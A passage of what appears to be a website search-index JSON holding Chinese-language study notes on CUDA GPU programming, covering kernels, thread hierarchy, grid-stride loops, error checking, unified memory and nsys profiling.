\u5f88\u5c0f\uff1b\u5185\u5b58\u5c0f\u4f46\u5feb\uff1b\u9002\u5408\u590d\u6742\u5e76\u884c</li> </ul>"},{"location":"cs/hpc/hpc101/gpu/#_1","title":"\u7f16\u7a0b\u6a21\u578b\u4e0e\u786c\u4ef6\u6267\u884c\u6a21\u578b","text":"<ul> <li>\u786c\u4ef6\u6267\u884c\u6a21\u578b\uff08Hardware Execution Model\uff09&lt;-&gt; CUDA \u7f16\u7a0b\u6a21\u578b</li> <li>GPU &lt;-&gt; Grid</li> <li>Streaming Multi-processor &lt;-&gt; Thread block</li> <li>CUDA core &lt;-&gt; Thread</li> </ul> <p>GPU \u7f16\u7a0b\u6a21\u578b\u662f SPMD\uff08Single Program Multiple Data\uff0c\u5355\u4ee3\u7801\u591a\u6570\u636e\uff09\uff0c\u4e5f\u5c31\u662f MultiThreaded</p> <p>\u4ee5\u4ee5\u4e0b\u4ee3\u7801\u4e3a\u4f8b</p> <pre><code>for (int i = 0; i &lt; N; ++i) {\n    C[i] = A[i] + B[i];\n}\n</code></pre> <ul> <li>SISD\uff08\u5355\u6307\u4ee4\u5355\u6570\u636e\uff09\uff1a\u6bcf\u5c42\u5faa\u73af\u662f load load add store\uff0c\u5faa\u73af N \u6b21</li> <li>SIMD\uff08\u5355\u6307\u4ee4\u591a\u6570\u636e\uff09\uff1a\u5229\u7528 SIMD \u6307\u4ee4\uff0c\u51cf\u5c11\u5faa\u73af\u6b21\u6570\uff0c\u4e00\u6b21\u6307\u4ee4\u6267\u884c\u591a\u6b21\u5faa\u73af\uff0cload \u591a\u4e2a\u6570\u3001add \u591a\u6b21\u3001store \u591a\u6b21</li> <li>SPMD\uff08\u5355\u4ee3\u7801\u591a\u6570\u636e\uff09\uff1a\u6267\u884c\u65f6\u5206\u4e3a\u591a\u4e2a thread\uff0c\u6bcf\u4e2a thread \u5904\u7406\u4e00\u6b21\u5faa\u73af\u7684\u6570\u636e</li> </ul>"},{"location":"cs/hpc/hpc101/gpu/#cuda","title":"CUDA","text":"<p>nvidia-smi \u547d\u4ee4\u67e5\u770b GPU \u4fe1\u606f</p> <p>CUDA C/C++ \u6587\u4ef6\u6269\u5c55\u540d\u4e3a .cu\uff0c\u4f7f\u7528 nvcc \u7f16\u8bd1\u3002\u4e00\u4e2a CUDA \u4ee3\u7801\u7684\u4f8b\u5b50\uff1a</p> <pre><code>void CPUFunction() {\n    printf(\"This function is defined to run on the CPU.\\n\");\n}\n\n__global__ void GPUFunction() {\n    printf(\"This function is defined to run on the GPU.\\n\");\n}\n\nint main() {\n    CPUFunction();\n    GPUFunction&lt;&lt;&lt;1, 1&gt;&gt;&gt;();\n    cudaDeviceSynchronize();\n}\n</code></pre> <p>\u5176\u4e2d\u4e00\u4e9b CUDA \u7279\u6709\u5185\u5bb9\u7684\u89e3\u91ca\uff1a</p> <ul> <li>__global__ void GPUFunction()<ul> <li>__global__ \u5173\u952e\u5b57\u8868\u660e\u4ee5\u4e0b\u51fd\u6570\u5c06\u5728 GPU \u4e0a\u8fd0\u884c\u5e76\u53ef\u5168\u5c40\u8c03\u7528\uff0c\u800c\u5728\u6b64\u79cd\u60c5\u51b5\u4e0b\uff0c\u5219\u6307\u7531 CPU \u6216 GPU \u8c03\u7528</li> <li>\u901a\u5e38\uff0c\u6211\u4eec\u5c06\u5728 CPU \u4e0a\u6267\u884c\u7684\u4ee3\u7801\u79f0\u4e3a\u4e3b\u673a\u4ee3\u7801\uff0c\u800c\u5c06\u5728 GPU \u4e0a\u8fd0\u884c\u7684\u4ee3\u7801\u79f0\u4e3a\u8bbe\u5907\u4ee3\u7801</li> <li>\u4f7f\u7528 __global__ \u5173\u952e\u5b57\u5b9a\u4e49\u7684\u51fd\u6570\u9700\u8981\u8fd4\u56de void \u7c7b\u578b</li> </ul> </li> <li>GPUFunction&lt;&lt;&lt;1, 1&gt;&gt;&gt;()<ul> <li>\u901a\u5e38\uff0c\u5f53\u8c03\u7528\u8981\u5728 GPU \u4e0a\u8fd0\u884c\u7684\u51fd\u6570\u65f6\uff0c\u6211\u4eec\u5c06\u6b64\u79cd\u51fd\u6570\u79f0\u4e3a\u5df2\u542f\u52a8\u7684\u6838\u51fd\u6570</li> <li>&lt;&lt;&lt; ... &gt;&gt;&gt; \u8bed\u6cd5\u63d0\u4f9b\u6267\u884c\u914d\u7f6e\uff0c\u5373\u7ebf\u7a0b\u5757\u7684\u6570\u91cf\u548c\u6bcf\u4e2a\u7ebf\u7a0b\u5757\u5185\u7684\u7ebf\u7a0b\u6570</li> </ul> </li> <li>cudaDeviceSynchronize()<ul> <li>\u6838\u51fd\u6570\u542f\u52a8\u65b9\u5f0f\u4e3a\u5f02\u6b65\uff1aCPU \u4ee3\u7801\u5c06\u7ee7\u7eed\u6267\u884c\u800c\u65e0\u9700\u7b49\u5f85\u6838\u51fd\u6570\u5b8c\u6210\u542f\u52a8\u3002</li> <li>\u8c03\u7528 CUDA \u8fd0\u884c\u65f6\u63d0\u4f9b\u7684\u51fd\u6570 cudaDeviceSynchronize \u53ef\u4ee5\u4f7f\u4e3b\u673a\uff08CPU\uff09\u4ee3\u7801\u6682\u4f5c\u7b49\u5f85\uff0c\u76f4\u81f3\u8bbe\u5907\uff08GPU\uff09\u4ee3\u7801\u6267\u884c\u5b8c\u6210\uff0c\u7136\u540e\u518d\u6062\u590d\u4e3b\u673a\u4ee3\u7801\u7684\u6267\u884c</li> </ul> </li> </ul> <p>\u6574\u4e2a\u8c03\u7528 GPU \u7684\u5927\u81f4\u6d41\u7a0b\u4e3a\uff1a</p> <p> </p> <ul> <li>\u5148\u5728 CPU \u4e2d\u8fdb\u884c\u6b63\u5e38 main \u51fd\u6570\u4e2d\u7684\u5de5\u4f5c\uff08\u5373\u56fe\u4e2d initialize\uff09</li> <li>\u7136\u540e CPU \u8c03\u7528 GPU \u6838\u51fd\u6570 performWork()\uff0c\u540c\u65f6 CPU \u4e2d\u7ee7\u7eed\u8fdb\u884c\u5b83\u8be5\u505a\u7684\u5176\u5b83\u5de5\u4f5c\uff08\u5373\u56fe\u4e2d cpuWork\uff09</li> <li>CPU \u6267\u884c\u5b8c cpuWork() \u540e\u7ecf\u8fc7 cudaDeviceSynchronize() \u4e0e GPU \u540c\u6b65\uff0c\u963b\u585e\u5f53\u524d CPU \u4efb\u52a1\uff0c\u7b49\u5f85 GPU \u7684 performWork \u6267\u884c\u5b8c</li> <li>\u540c\u6b65\u540e CPU \u7ee7\u7eed\u6267\u884c\u5269\u4e0b\u7684 verifyWork()</li> </ul>"},{"location":"cs/hpc/hpc101/gpu/#_2","title":"\u7f16\u8bd1","text":"<p>\u4f7f\u7528 nvcc \u8fdb\u884c\u7f16\u8bd1\uff0c\u4f8b\u5982\uff1a <pre><code>$ nvcc -arch=sm_70 -o out code.cu -run\n</code></pre> - \u4f7f\u7528 sm_70 \u67b6\u6784 - \u7f16\u8bd1 code.cu \u6587\u4ef6 - \u8f93\u51fa\u4e3a out \u53ef\u6267\u884c\u6587\u4ef6 - -run \u6807\u5fd7\u6807\u8bc6\u7f16\u8bd1\u5b8c\u7acb\u5373\u6267\u884c</p> <p>\u53e6\u5916\uff0c\u53ef\u4ee5\u4f7f\u7528 -std=c++11 \u6765\u6307\u5b9a C/C++ \u8bed\u8a00\u7248\u672c</p>"},{"location":"cs/hpc/hpc101/gpu/#_3","title":"\u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784","text":"<p>\u6b63\u5982\u524d\u9762 1.1 \u63d0\u5230\uff0cCUDA \u7684\u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784\u4ece\u5927\u5230\u5c0f\u4e3a Grid -&gt; Thread Block -&gt; Thread</p> <p>\u7ed3\u6784\u793a\u610f\u56fe\uff1a</p> <p> </p> <p>\u6bcf\u4e2a\u7ebf\u7a0b\uff08Thread\uff09\u4e2d\u90fd\u8fd0\u884c\u4e00\u4efd\u6838\u51fd\u6570\u4e2d\u5185\u5bb9\uff0c\u591a\u4e2a\u7ebf\u7a0b\u7ec4\u6210\u4e00\u4e2a\u7ebf\u7a0b\u5757\uff08Thread Block\uff09\uff0c\u4e0e\u6838\u51fd\u6570\u542f\u52a8\u5173\u8054\u7684\u6240\u6709\u5757\u7ec4\u6210\u7f51\u683c\uff08Grid\uff09</p> <p>\u542f\u52a8\u6838\u51fd\u6570\u65f6\u8fdb\u884c\u7684\u914d\u7f6e\u5c31\u662f &lt;&lt;&lt;\u7ebf\u7a0b\u5757\u6570, \u6bcf\u4e2a\u5757\u4e2d\u7ebf\u7a0b\u6570&gt;&gt;&gt;\uff0c\u5176\u4e2d\u6bcf\u5757\u4e2d\u7ebf\u7a0b\u6570\u4e00\u822c\u6700\u5927\u4e3a 1024</p>"},{"location":"cs/hpc/hpc101/gpu/#_4","title":"\u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784\u53d8\u91cf","text":"<p>\u5728\u6838\u51fd\u6570\u4e2d\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee CUDA \u63d0\u4f9b\u7684\u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784\u53d8\u91cf\uff0c\u5e38\u7528\u7684\u6709\uff1a</p> <ul> <li>gridDim.x\uff1aGrid \u4e2d\u7684 Block \u6570</li> <li>blockIdx.x\uff1a\u5f53\u524d Block \u5728 Grid \u4e2d\u7684\u7d22\u5f15</li> <li>blockDim.x\uff1a\u6bcf\u4e2a Block \u4e2d\u7684 Thread \u6570</li> <li>threadIdx.x\uff1a\u5f53\u524d Thread \u5728\u6240\u5728\u7684 Block \u4e2d\u7684\u7d22\u5f15</li> </ul>"},{"location":"cs/hpc/hpc101/gpu/#_5","title":"\u534f\u8c03\u5e76\u884c\u7ebf\u7a0b","text":"<p>\u4f8b\u5982\u5e76\u884c\u52a0\u901f for \u5faa\u73af\uff0c\u4e3a\u4e86\u4f7f\u6bcf\u4e2a\u7ebf\u7a0b\u4e2d\u6838\u51fd\u6570\u5747\u5904\u7406\u4e0d\u540c\u7684 i\uff0c\u8bbf\u95ee\u5185\u5b58 arr[i]\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684\u53d8\u91cf\u8fdb\u884c\u8ba1\u7b97\uff1a <pre><code>i = threadIdx.x + blockIdx.x * blockDim.x\n</code></pre> \u5373\u6bcf\u4e2a\u7ebf\u7a0b\u5904\u7406\u7684 i \u4e3a\uff1a</p> <p> </p> <p>\u4f46\u8fd9\u662f\u7406\u60f3\u60c5\u51b5\uff0c\u6709\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\u9700\u8981\u5904\u7406\uff1a</p> <ol> <li>\u603b\u7ebf\u7a0b\u6570\u591a\u4e8e\u8981\u5904\u7406\u7684\u6570\u636e\u6570\uff08\u6216\u8005\u8bf4\u5faa\u73af\u6b21\u6570\uff09\uff0c\u5219\u8fd9\u6837\u505a\u4f1a\u8bbf\u95ee\u5230\u975e\u6cd5\u5185\u5b58</li> <li>\u603b\u7ebf\u7a0b\u6570\u5c11\u4e8e\u8981\u5904\u7406\u7684\u6570\u636e\u6570\uff0c\u5219\u8fd9\u6837\u505a\u4f1a\u5b58\u5728\u6ca1\u6709\u6267\u884c\u7684\u5faa\u73af</li> </ol> <p>\u5bf9\u4e8e\u7b2c\u4e00\u79cd\uff0c\u53ea\u9700\u8981\u5728\u8ba1\u7b97\u5f97\u5230 i \u4e4b\u540e\u4e0e\u603b\u6570 n \u6bd4\u8f83\uff0c\u5982\u679c i &lt; n \u5219\u6267\u884c\uff0c\u5426\u5219\u5728\u8fd9\u4e2a\u7ebf\u7a0b\u5185\u4ec0\u4e48\u90fd\u4e0d\u505a</p> <p>\u5bf9\u4e8e\u7b2c\u4e8c\u79cd\uff0c\u5219\u9700\u8981\u6bcf\u4e2a\u7ebf\u7a0b\u6267\u884c\u4e0d\u6b62\u4e00\u4e2a\u5faa\u73af\u7684\u5de5\u4f5c\uff0c\u4e5f\u5c31\u662f\u4f7f\u7528\u7f51\u683c\u8de8\u5ea6\u5faa\u73af\uff1a</p> <p> </p> <p>\u800c\u6bcf\u4e2a\u7ebf\u7a0b\u8fdb\u884c\u5faa\u73af\u7684\u8de8\u5ea6\u6070\u597d\u4e3a Grid \u4e2d\u7684\u603b\u7ebf\u7a0b\u6570\uff0c\u56e0\u4e3a gridDim.x \u8868\u793a Grid \u4e2d Block \u6570\uff0cblockDim.x \u8868\u793a\u6bcf\u4e2a Block \u4e2d Thread \u6570\uff0c\u6240\u4ee5\u8fd9\u4e2a\u8de8\u5ea6\u6070\u597d\u662f <code>gridDim.x * blockDim.x</code></p> <p>\u56e0\u6b64 for \u5faa\u73af\u901a\u8fc7\u6838\u51fd\u6570\u5728 GPU \u4e2d\u5e76\u884c\u8fd0\u884c\u7684\u5e38\u7528\u5199\u6cd5\u662f\uff1a <pre><code>__global__ void kernel(int *a, int N) {\n    int idx = threadIdx.x + blockIdx.x * blockDim.x;\n    int stride = gridDim.x * blockDim.x;\n    for (int i = idx; i &lt; N; i += stride) {\n        // a[i] ...\n    }\n}\n</code></pre></p>"},{"location":"cs/hpc/hpc101/gpu/#_6","title":"\u4e8c\u7ef4\u548c\u4e09\u7ef4\u7684\u7f51\u683c\u548c\u5757","text":"<p>\u7f51\u683c\u548c\u7ebf\u7a0b\u5757\u6700\u591a\u53ef\u4ee5\u6709\u4e09\u4e2a\u7ef4\u5ea6\uff0c\u4f7f\u7528\u591a\u7ef4\u5ea6\u5b9a\u4e49\u7f51\u683c\u548c\u5757\u4e0d\u4f1a\u5bf9\u6027\u80fd\u9020\u6210\u5f71\u54cd\uff0c\u4f46\u662f\u5728\u5904\u7406\u591a\u7ef4\u6570\u636e\u65f6\u4f1a\u66f4\u65b9\u4fbf</p> <p>\u5b9a\u4e49\u4e8c\u7ef4\u6216\u4e09\u7ef4\u7684\u7f51\u683c\u548c\u5757\u53ef\u4ee5\u4f7f\u7528 CUDA \u63d0\u4f9b\u7684 dim3 \u7c7b\u578b\uff1a <pre><code>dim3 threadsPerBlock(16, 16, 1);\ndim3 numberOfBlocks(16, 16, 1);\nkernel&lt;&lt;&lt;numberOfBlocks, threadsPerBlock&gt;&gt;&gt;(...);\n</code></pre> \u5728\u6838\u51fd\u6570\u4e2d\uff0c<code>gridDim.x</code> <code>gridDim.y</code> <code>blockDim.x</code> <code>blockDim.y</code> \u5747\u4e3a 16</p> <p>\u4e8c/\u4e09\u7ef4\u5faa\u73af\u7684\u5e76\u884c\u5904\u7406\u4e5f\u7c7b\u4f3c\u4e0a\u9762\u4e00\u7ef4\u60c5\u51b5\uff1a <pre><code>__global__ void kernel(int **a, int N1, int N2) {\n    int idxx = threadIdx.x + blockIdx.x * blockDim.x;\n    int stridex = gridDim.x * blockDim.x;\n    int idxy = threadIdx.y + blockIdx.y * blockDim.y;\n    int stridey = gridDim.y * blockDim.y;\n    for (int i = idxx; i &lt; N1; i += stridex) {\n        for (int j = idxy; j &lt; N2; j += stridey) {\n            // a[i][j] ...\n        }\n    }\n}\n</code></pre></p>"},{"location":"cs/hpc/hpc101/gpu/#_7","title":"\u9519\u8bef\u5904\u7406","text":"<p>\u8bb8\u591a CUDA \u51fd\u6570\u4f1a\u8fd4\u56de\u7c7b\u578b\u4e3a cudaError_t \u7684\u503c\uff0c\u6765\u7528\u4e8e\u540e\u7eed\u68c0\u67e5\u8c03\u7528\u51fd\u6570\u65f6\u662f\u5426\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u6ca1\u6709\u9519\u8bef\u7684\u503c\u4e3a cudaSuccess\uff0c\u5982\u679c\u6709\u9519\u8bef\uff0c\u53ef\u4ee5\u901a\u8fc7 cudaGetErrorString \u6765\u83b7\u53d6\u9519\u8bef\u7684\u5177\u4f53\u5185\u5bb9\u3002\u4ee5 cudaMallocManaged \u4e3a\u4f8b\uff1a <pre><code>cudaError_t err;\nerr = cudaMallocManaged(&amp;a, N);\nif (err != cudaSuccess) {\n    printf(\"Error: %s\\n\", cudaGetErrorString(err));\n}\n</code></pre> \u4f46\u6838\u51fd\u6570\u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u56e0\u6b64\u68c0\u67e5\u542f\u52a8\u6838\u51fd\u6570\u65f6\u662f\u5426\u53d1\u751f\u9519\u8bef\uff08\u4f8b\u5982\u542f\u52a8\u914d\u7f6e\u9519\u8bef\uff09\u9700\u8981\u4f7f\u7528 CUDA \u63d0\u4f9b\u7684 cudaGetLastError \u51fd\u6570\uff1a <pre><code>kernel&lt;&lt;&lt;1, -1&gt;&gt;&gt;();\ncudaError_t err;\nerr = cudaGetLastError;\nif (err != cudaSuccess) {\n    printf(\"Error: %s\\n\", cudaGetErrorString(err));\n}\n</code></pre> \u800c\u4e3a\u4e86\u6355\u83b7\u5f02\u6b65\u9519\u8bef\uff08\u5982\u5728\u6838\u51fd\u6570\u6267\u884c\u671f\u95f4\u51fa\u73b0\u7684\u9519\u8bef\uff09\uff0c\u5219\u9700\u8981\u68c0\u67e5 cudaDeviceSynchronize \u7684\u8fd4\u56de\u503c\uff0c\u4e00\u4e2a\u5b9e\u7528\u5199\u6cd5\u662f\uff1a <pre><code>#include &lt;assert.h&gt;\ninline cudaError_t checkCuda(cudaError_t result) {\n    if (result != cudaSuccess) {\n        fprintf(stderr, \"CUDA Runtime Error: %s\\n\", cudaGetErrorString(result));\n        assert(result == cudaSuccess);\n    }\n    return result;\n}\n\nint main() {\n    ...\n    kernel&lt;&lt;&lt;..., ...&gt;&gt;&gt;(...);\n    checkCuda(cudaGetLastError());\n    checkCuda(cudaDeviceSynchronize());\n    ...\n}\n</code></pre></p>"},{"location":"cs/hpc/hpc101/gpu/#_8","title":"\u5206\u914d\u5185\u5b58","text":"<p>C \u5206\u914d\u5185\u5b58\u4f7f\u7528\u7684\u662f malloc \u51fd\u6570\uff0c\u4f46\u901a\u8fc7 malloc \u5f97\u5230\u7684\u5185\u5b58\u53ea\u80fd\u5728 CPU \u4e2d\u8bbf\u95ee</p> <p>\u9700\u8981\u5728 CPU \u548c GPU \u4e2d\u540c\u65f6\u8bbf\u95ee\u67d0\u5185\u5b58\uff0c\u9700\u8981\u901a\u8fc7 cudaMallocManaged \u51fd\u6570\u6765\u5206\u914d\uff0c\u5373\uff1a <pre><code>int *a;\nsize_t size = n * sizeof(int);\na = (int*)malloc(size) -&gt; cudaMallocManaged(&amp;a, size)\n</code></pre> \u7136\u540e\u91ca\u653e\u5185\u5b58\u65f6\u4f7f\u7528 cudaFree \u4ee3\u66ff free\uff0c\u5373 cudaFree(a)</p> <p>\u6ce8\u610f\uff1a\u5229\u7528 cudaMallocManaged \u5206\u914d\u7684\u5185\u5b58\u53ef\u4ee5\u5728 CPU \u548c GPU \u4e2d\u4f7f\u7528\uff08\u540e\u9762\u4f1a\u8bf4\uff09\uff0c\u5229\u7528 cudaMalloc \u5206\u914d\u7684\u5185\u5b58\u53ea\u53ef\u4ee5\u5728 GPU \u4e2d\u4f7f\u7528</p>"},{"location":"cs/hpc/hpc101/gpu/#nsys","title":"nsys \u6027\u80fd\u5206\u6790","text":"<p>nsys\uff08Nsight System\uff09\u662f CUDA \u5de5\u5177\u5305\u9644\u5e26\u7684\u6027\u80fd\u5206\u6790\u5668\uff0c\u53ef\u4ee5\u6267\u884c\u7a0b\u5e8f\u5e76\u751f\u6210\u5305\u542b GPU \u6d3b\u52a8\u3001CUDA API \u8c03\u7528\u3001\u5185\u5b58\u6d3b\u52a8\u7b49\u4fe1\u606f\u7684\u62a5\u544a\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 GUI \u67e5\u770b\u65f6\u95f4\u8f74</p> <p>nsys \u4f7f\u7528\u53ea\u9700\u8981\u6307\u5b9a nvcc \u7f16\u8bd1\u597d\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5373\u53ef\uff1a <pre><code>$ nsys profile --stats=true ./out\n</code></pre> - \u4f7f\u7528 nsys profile \u8fdb\u884c\u5206\u6790 - --stats=true \u8868\u793a\u5411\u547d\u4ee4\u884c\u4e2d\u6253\u5370\u6458\u8981\u4fe1\u606f - \u5206\u6790 out \u7a0b\u5e8f</p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528 -o \u6307\u5b9a\u62a5\u544a\u8f93\u51fa\u6587\u4ef6\uff0c\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u4f7f\u7528 Nsight System GUI \u8f6f\u4ef6\u6253\u5f00\u8fdb\u884c\u5206\u6790</p> <p>nsys \u9ed8\u8ba4\u4e0d\u4f1a\u8986\u76d6\u539f\u6709\u62a5\u544a\uff0c\u9700\u8981\u8986\u76d6\u8981\u4f7f\u7528 CLI flag --force-overwrite=true</p>"},{"location":"cs/hpc/hpc101/gpu/#_9","title":"\u6d41\u591a\u5904\u7406\u5668","text":"<p>\u6d41\u591a\u5904\u7406\u5668\uff08SM\uff0cStreaming Multiprocessor\uff09\u662f\u8fd0\u884c CUDA \u7684 GPU \u4e0a\u7684\u5904\u7406\u5355\u5143</p> <p>\u5728\u6838\u51fd\u6570\u6267\u884c\u671f\u95f4\uff0c\u7ebf\u7a0b\u5757\u4f1a\u63d0\u4f9b\u7ed9 SM \u8fdb\u884c\u6267\u884c\uff0c\u56e0\u6b64\u4e3a\u4e86\u652f\u6301 GPU \u6267\u884c\u5c3d\u53ef\u80fd\u591a\u7684\u5e76\u884c\u64cd\u4f5c\uff0c\u63d0\u9ad8 SM \u7684\u5229\u7528\u7387\u8fdb\u800c\u63d0\u9ad8\u6027\u80fd\uff0c\u4e00\u822c\u5c06\u7ebf\u7a0b\u5757\u6570\uff08\u4e5f\u5c31\u662f\u7f51\u683c\u7ef4\u5ea6\uff09\u6307\u5b9a\u4e3a SM \u6570\u91cf\u7684\u500d\u6570</p> <p>\u6b64\u5916\uff0cSM \u4f1a\u5728\u540d\u4e3a Warp \u7684\u7ebf\u7a0b\u5757\u5185\u521b\u5efa\u3001\u7ba1\u7406\u3001\u8c03\u5ea6\u3001\u6267\u884c\u5305\u542b 32 \u4e2a\u7ebf\u7a0b\u7684\u7ebf\u7a0b\u7ec4\uff0c\u56e0\u6b64\u4e00\u822c\u4e5f\u5c06\u7ebf\u7a0b\u6570\u91cf\u6307\u5b9a\u4e3a 32 \u7684\u500d\u6570</p>"},{"location":"cs/hpc/hpc101/gpu/#gpu_2","title":"\u67e5\u8be2 GPU \u8bbe\u5907\u5c5e\u6027","text":"<p>CUDA \u63d0\u4f9b\u4e86\u83b7\u53d6\u5f53\u524d\u5904\u4e8e\u6d3b\u8dc3\u72b6\u6001\u7684 GPU \u8bbe\u5907\u5c5e\u6027\u7684 API\uff1a <pre><code>int deviceId;\ncudaGetDevice(&amp;deviceId);\ncudaDeviceProp props;\ncudaGetDeviceProperties(&amp;props, deviceId);\n</code></pre> \u5176\u4e2d cudaGetDevice \u83b7\u53d6\u8bbe\u5907 id\uff0ccudaDeviceProp \u4e3a\u5c5e\u6027\u7684\u7ed3\u6784\u7c7b\u578b\uff0ccudaGetDeviceProperties \u6839\u636e\u8bbe\u5907 id \u83b7\u53d6\u5177\u4f53\u5c5e\u6027</p> <p>\u6240\u6709\u5c5e\u6027\u89c1\uff1aNVIDIA CUDA \u8fd0\u884c\u65f6\u6587\u6863</p> <p>\u7ed3\u5408\u4e0a\u9762\uff0c\u4e00\u822c\u8bbe\u7f6e\u5757\u6570\u548c\u7ebf\u7a0b\u6570\u4f7f\u7528\uff1a <pre><code>int deviceId;\nint numberOfSMs;\n\ncudaGetDevice(&amp;deviceId);\ncudaDeviceGetAttribute(&amp;numberOfSMs, cudaDevAttrMultiProcessorCount, deviceId);\n\nsize_t threadsPerBlock = 256;\nsize_t numberOfBlocks = 32 * numberOfSMs;\n</code></pre></p>"},{"location":"cs/hpc/hpc101/gpu/#_10","title":"\u7edf\u4e00\u5185\u5b58","text":"<p>\u4f7f\u7528 cudaMallocManaged \u5206\u914d\u7684\u5185\u5b58\u4e3a\u7edf\u4e00\u5185\u5b58\uff08UM\uff0cUnified Memory\uff09</p> <p>\u7edf\u4e00\u5185\u5b58\u5728 CPU \u548c GPU \u5206\u522b\u8bbf\u95ee\u65f6\u7684\u884c\u4e3a\u5982\u4e0b\uff1a</p> <p> </p> <ul> <li>\u521a\u5f00\u59cb\u65f6\u5206\u914d\u7684\u5185\u5b58\u4e0d\u5728 CPU \u4e0a\u4e5f\u4e0d\u5728 GPU \u4e0a</li> <li>\u54ea\u4e00\u65b9\u5148\u8bbf\u95ee\uff0c\u4f1a\u9020\u6210\u4e00\u4e2a\u9875\u9519\u8bef\uff08page fault\uff09\uff0c\u7136\u540e\u5c06\u9700\u8981\u7684\u5185\u5b58\u8fc1\u79fb\u5230\u81ea\u5df1\u8eab\u4e0a</li> <li>\u53e6\u4e00\u65b9\u8bbf\u95ee\u65f6\u4e5f\u4f1a\u9020\u6210\u9875\u9519\u8bef\uff0c\u7136\u540e\u518d\u5c06\u9700\u8981\u7684\u5185\u5b58\u8fc1\u79fb\u5230\u81ea\u5df1\u8eab\u4e0a</li> </ul> <p>\u6570\u636e\u4ece\u4e3b\u673a\u5230\u8bbe\u5907\u7684\u8fc1\u79fb\u8bb0\u4e3a HtoD\uff0c\u4ece\u8bbe\u5907\u5230\u4e3b\u673a\u7684\u8fc1\u79fb\u8bb0\u4e3a DtoH\uff0c\u901a\u8fc7 nsys \u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u8f6c\u79fb\u64cd\u4f5c</p> <p>\u5728\u7a00\u758f\u8bbf\u95ee\u6a21\u5f0f\u60c5\u51b5\u4e0b\uff0c\u8fd9\u6837\u53ef\u4ee5\u6309\u9700\u8fc1\u79fb\u5185\u5b58\uff0c\u5c24\u5176\u662f\u5728\u591a\u4e2a GPU \u52a0\u901f\u7cfb\u7edf\u4e2d\uff0c\u8fd9\u6837\u7684\u6309\u9700\u8fc1\u79fb\u4f1a\u6709\u663e\u8457\u4f18\u52bf</p> <p>\u6709\u65f6\u53ef\u4ee5\u5c06\u5185\u5b58\u521d\u59cb\u5316\u653e\u5728 GPU \u4e2d\u8fdb\u884c\uff0c\u8fd9\u6837 UM \u4f1a\u5148\u8fc1\u79fb\u5230 GPU \u4e2d\uff0c\u7136\u540e\u9a7b\u7559\u5728 GPU \u91cc\u8fdb\u884c\u540e\u9762\u7684\u8ba1\u7b97\u64cd\u4f5c\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u5728\u4e3b\u673a\u548c\u8bbe\u5907\u4e4b\u95f4\u7684\u8fc1\u79fb\u6b21\u6570\uff0c\u63d0\u9ad8\u6548\u7387</p>"},{"location":"cs/hpc/hpc101/gpu/#_11","title":"\u5f02\u6b65\u5185\u5b58\u9884\u53d6","text":"<p>\u4f46\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff08\u6bd4\u5982\u9700\u8981\u8fde\u7eed\u5927\u7247\u5185\u5b58\uff09\uff0c\u5219\u9884\u5148\u5c06\u5185\u5b58\u8fc1\u79fb\u51fa\u6765\u53ef\u4ee5\u89c4\u907f\u9875\u9519\u8bef\uff0c\u5e76\u4e14\u51cf\u5c11\u6309\u9700\u5185\u5b58\u8fc1\u79fb\u7684\u6210\u672c</p> <p>CUDA \u53ef\u901a\u8fc7 cudaMemPrefetchAsync \u51fd\u6570\u6765\u5c06 UM \u9884\u53d6\u5230\u67d0\u4e00\u8bbe\u5907\u4e2d\uff0c\u6bd4\u5982\uff1a <pre><code>int deviceId;\ncudaGetDevice(&amp;deviceId);\n\ncudaMemPrefetchAsync(pointerToSomeUMData, size, deviceId);\n...\ncudaMemPrefetchAsync(pointerToSomeUMData, size, cudaCpuDeviceId);\n</code></pre> cudaMemPrefetchAsync \u9700\u8981\u63d0\u4f9b UM \u7684\u6307\u9488\u3001\u5927\u5c0f\u3001\u4ee5\u53ca\u8981\u9884\u53d6\u5230\u7684\u8bbe\u5907\u3002\u5176\u4e2d deviceId \u901a\u8fc7 cudaGetDevice \u83b7\u53d6\uff0ccudaCpuDeviceId \u662f CUDA \u5185\u7f6e\u53d8\u91cf\uff0c\u8868\u793a CPU</p>"},{"location":"cs/hpc/hpc101/gpu/#_12","title":"\u624b\u52a8\u5185\u5b58\u5206\u914d","text":"<p>\u4e00\u4e9b\u624b\u52a8\u5185\u5b58\u7ba1\u7406\u7684 CUDA \u51fd\u6570\uff1a</p> <ul> <li>cudaMalloc\uff1a\u76f4\u63a5\u4e3a GPU \u5206\u914d\u5185\u5b58\uff0c\u9632\u6b62\u51fa\u73b0 GPU \u5206\u9875\u9519\u8bef\uff0c\u4f46\u662f CPU \u65e0\u6cd5\u8bbf\u95ee\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488</li> <li>cudaMallocHost\uff1a\u76f4\u63a5\u4e3a CPU \u5206\u914d\u5185\u5b58\uff0c\u79f0\u4e3a\u56fa\u5b9a\u5185\u5b58\uff08pinned memory\uff09\u6216\u9875\u9501\u5b9a\u5185\u5b58\uff08page-locked memory\uff09\uff0c\u5141\u8bb8\u5c06\u5185\u5b58\u5f02\u6b65\u62f7\u8d1d\u5230 GPU \u6216\u4ece GPU \u5f02\u6b65\u62f7\u8d1d\u56de\u6765\u3002\u4f46\u56fa\u5b9a\u5185\u5b58\u8fc7\u591a\u4f1a\u5e72\u6270 CPU \u6027\u80fd\u3002\u91ca\u653e\u65f6\u4f7f\u7528 cudaFreeHost</li> <li>cudaMemcpy\uff1a\u4e3b\u673a\u4e0e\u8bbe\u5907\u4e4b\u95f4\u62f7\u8d1d\u5185\u5b58</li> <li>cudaMemcpyAsync\uff1a\u4e3b\u673a\u4e0e\u8bbe\u5907\u4e4b\u95f4\u5f02\u6b65\u62f7\u8d1d\u5185\u5b58</li> </ul> 